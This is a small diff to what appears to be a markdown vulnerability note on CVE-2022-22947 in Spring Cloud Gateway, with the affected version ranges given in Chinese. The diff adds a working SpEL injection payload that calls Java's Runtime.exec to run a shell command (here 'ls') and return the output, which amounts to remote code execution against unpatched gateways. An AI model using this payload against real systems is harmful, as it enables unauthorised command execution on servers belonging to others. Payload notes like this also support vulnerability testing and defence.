@@ -1,5 +1,7 @@
 ### CVE-2022-22947
-
+```
+#{new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke(T(java.lang.Runtime).getRuntime().exec(new String[]{'ls'}))).useDelimiter('\A').next().replace('\n',' ')}
+```
 影响版本：
 > org.springframework.cloud:spring-cloud-gateway-server
 > [,3.0.7) [3.1.0,3.1.1) 
